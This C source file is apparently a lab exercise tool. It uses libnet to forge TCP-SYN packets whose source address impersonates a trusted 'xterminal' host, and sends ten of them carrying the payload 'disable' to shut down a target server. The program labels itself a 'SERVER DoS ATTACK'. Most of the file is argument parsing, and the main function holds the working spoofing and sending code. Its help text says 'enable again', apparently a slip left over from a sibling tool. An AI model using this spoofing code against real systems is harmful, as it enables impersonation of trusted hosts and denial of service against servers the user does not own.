/* SERVER DISABLE.c
 *   by Lut99
 *
 * Created:
 *   11/09/2020, 17:05:05
 * Last edited:
 *   13/09/2020, 15:02:15
 * Auto updated?
 *   Yes
 *
 * Description:
 *   This file attempts to disable the server by sending ten (potentially)
 *   spoofed TCP-SYN packets with 'disable' in their payload. Use the
 *   'check_server' executable to see if it actually worked.
**/

#include <stdio.h>
#include <stddef.h>

#include "tools.h"
#include "networking.h"
#include "globals.h"


/***** HELPER FUNCTIONS *****/
/* Prints a neat help message. */
void print_help(char* executable) {
    printf("Usage: %s -h -I SERVER_IP -P SERVER_PORT -i XTERM_IP -p XTERM_PORT -d INTERFACE\n\n", executable);
    printf("-h, --help\t\tShows this help message.\n");
    printf("-I, --server-ip\t\tSets the IPv4-address of the server we want to enable again (DEFAULT: %u.%u.%u.%u).\n",
           IP_FORMAT(DEFAULT_SERVER_ADDR));
    printf("-P, --server-port\tSets the port of the server we want to enable again (DEFAULT: %u).\n",
           DEFAULT_SERVER_PORT);
    printf("-i, --xterm-ip\t\tSets the IPv4-address of the xterminal we want to impersonate (DEFAULT: %u.%u.%u.%u).\n",
           IP_FORMAT(DEFAULT_XTERM_ADDR));
    printf("-p, --xterm-port\tSets the port of the xterminal we want to impersonate (DEFAULT: random).\n");
    printf("-d, --device\t\tSets the interface we want to use (DEFAULT: '%s').\n",
           DEFAULT_INTERFACE);
    printf("\n");
}

/* Parses the commandline arguments. Returns 0 on success, or an error code if something went wrong. */
int parse_cli(uint32_t* server_ip, uint16_t* server_port, uint32_t* xterm_ip, uint16_t* xterm_port, char* interface, int argc, char** argv) {
    for (int i = 1; i < argc; i++) {
        char* arg = argv[i];
        if (arg[0] == '-') {
            // Either single-label or multi-label
            if ((arg[1] == 'h' && arg[2] == '\0') || streq(arg + 1, "-help")) {
                // Print the help message, then quit
                print_help(argv[0]);
                return -2;
            } else if ((arg[1] == 'I' && arg[2] == '\0') || streq(arg + 1, "-server-ip")) {
                // server ip, so parse the next argument as an ip
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (!str_to_ip(server_ip, argv[i + 1])) {
                    fprintf(stderr, "[ERROR] Could not parse '%s' as an IPv4 address.\n", argv[i + 1]);
                    return EXIT_FAILURE;
                }
            } else if ((arg[1] == 'P' && arg[2] == '\0') || streq(arg + 1, "-server-port")) {
                // server port, so parse the next argument as an 16-bit unsigned integer
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (!str_to_uint16(server_port, argv[i + 1])) {
                    fprintf(stderr, "[ERROR] Could not parse '%s' as a 16-bit port number.\n", argv[i + 1]);
                    return EXIT_FAILURE;
                }
            } else if ((arg[1] == 'i' && arg[2] == '\0') || streq(arg + 1, "-xterm-ip")) {
                // spoofed ip, so parse the next argument as an ip
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (!str_to_ip(xterm_ip, argv[i + 1])) {
                    fprintf(stderr, "[ERROR] Could not parse '%s' as an IPv4 address.\n", argv[i + 1]);
                    return EXIT_FAILURE;
                }
            } else if ((arg[1] == 'p' && arg[2] == '\0') || streq(arg + 1, "-xterm-port")) {
                // spoofed port, so parse the next argument as an 16-bit unsigned integer
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (!str_to_uint16(xterm_port, argv[i + 1])) {
                    fprintf(stderr, "[ERROR] Could not parse '%s' as a 16-bit port number.\n", argv[i + 1]);
                    return EXIT_FAILURE;
                }
            } else if ((arg[1] == 'd' && arg[2] == '\0') || streq(arg + 1, "-device")) {
                // The interface, which we can copy literally (if not too large)
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (strlen(argv[i + 1]) >= MAX_INTERFACE_SIZE) {
                    fprintf(stderr, "[ERROR] Device name '%s' too long.\n", argv[i + 1]);
                    return -1;
                }
                strcpy(interface, argv[i + 1]);
            } else {
                fprintf(stderr, "[ERROR] Unknown option '%s' (see '--help' for a complete list).\n", arg);
                return -1;
            }
        }
    }

    // Done
    return 0;
}



/***** ENTRY POINT *****/
int main(int argc, char** argv) {
    // First, initialize the options
    uint32_t server_ip = DEFAULT_SERVER_ADDR;
    uint16_t server_port = DEFAULT_SERVER_PORT;
    uint32_t xterm_ip = DEFAULT_XTERM_ADDR;
    uint16_t xterm_port = libnet_get_prand(LIBNET_PRu16);
    char interface[MAX_INTERFACE_SIZE];
    strcpy(interface, DEFAULT_INTERFACE);

    // Parse the options from the command line
    int result = parse_cli(&server_ip, &server_port, &xterm_ip, &xterm_port, interface, argc, argv);
    if (result != 0) {
        return result;
    }



    /* Print a neat header message. */
    printf("\n*** SERVER DoS ATTACK (standalone) ***\n\n");

    // Print the options used
    printf("Using options:\n");
    printf(" - Server IP      : %u.%u.%u.%u\n", IP_FORMAT(server_ip));
    printf(" - Server port    : %u\n", server_port);
    printf(" - Xterminal IP   : %u.%u.%u.%u\n", IP_FORMAT(xterm_ip));
    printf(" - Xterminal port : %u\n", xterm_port);
    printf(" - Interface      : '%s'\n", interface);
    printf("\n");
    fflush(stdout);

    printf("Initializing libnet on interface '%s'...\n", interface);
    // Initialize the the error message buffer.
    char errbuf[LIBNET_ERRBUF_SIZE];

    // Open a raw IP4 socket
    libnet_t* l;
    l = libnet_init(LIBNET_RAW4, interface, errbuf);
    if (l == NULL) {
        fprintf(stderr, "[ERROR] Could not initialize libnet: %s\n\n", errbuf);
        return EXIT_FAILURE;
    }

    // Set the random seed appropriately
    if (libnet_seed_prand(l) == -1) {
        libnet_destroy(l);
        fprintf(stderr, "[ERROR] Could not seed the random number generator of libnet.\n");
        return EXIT_FAILURE;
    }

    printf("Attempting to disable server...\n");
    // Prepare a TCP packet on the wire
    if (create_tcp_syn(l, xterm_ip, xterm_port, server_ip, server_port, libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32), "disable", 7) != 0) {
        return EXIT_FAILURE;
    }

    // Send the packet on its way (x10)
    for (int i = 0; i < 10; i++) {
        if (libnet_write(l) == -1) {
            fprintf(stderr, "[ERROR] Could not send server-enable packet: %s\n", libnet_geterror(l));
            return EXIT_FAILURE;
        }
    }
    printf("Done (run 'check_server' to see if it was successful)\n");

    // Done, close the sockets
    libnet_destroy(l);

    // We did!
    printf("\nDone.\n\n");
    return EXIT_SUCCESS;
}
